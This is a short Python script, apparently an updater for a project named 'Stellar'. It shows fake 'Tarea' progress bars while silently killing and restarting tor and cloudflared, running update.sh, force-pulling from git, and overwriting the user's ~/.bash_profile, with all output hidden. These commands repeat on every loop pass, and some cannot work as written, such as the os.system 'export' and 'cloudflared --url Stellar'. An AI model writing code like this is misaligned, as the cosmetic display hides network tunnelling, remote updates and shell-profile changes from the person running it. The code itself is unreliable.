from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn
import os
import time
import itertools

console = Console()

def red_green_cycle():
    colors = ["red", "green"]
    while True:
        for color in colors:
            yield color

color_cycle = red_green_cycle()

with Progress(
    TextColumn("[progress.description]{task.description}"),
    BarColumn(bar_width=None, style="bold bright"),
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    console=console,
    refresh_per_second=30,
) as progress:
    
    tasks = []
    for i in range(14):
        color = next(color_cycle)
        tasks.append(progress.add_task(f"[{color}]Tarea {i+1}", total=1000))

    while not progress.finished:
        for i, task in enumerate(tasks):
            color = next(color_cycle)
            progress.update(task, description=f"[{color}]Tarea {i+1}", advance=1.5)
            
        os.system("clear")
        os.system("pkill tor &>/dev/null &")
        os.system("pkill cloudflared &>/dev/null &")
        os.system("sleep 1")
        os.system("export ALL_PROXY=socks5h://localhost:9050")
        os.system("tor &>/dev/null &")
        os.system("sleep 1")
        os.system("cloudflared --url Stellar &>/dev/null &")
        os.system("cd && cd Stellar && bash update.sh &>/dev/null &")
        os.system("git pull --force")
        os.system("cp ~/Stellar/configuración/.bash_profile ~/.")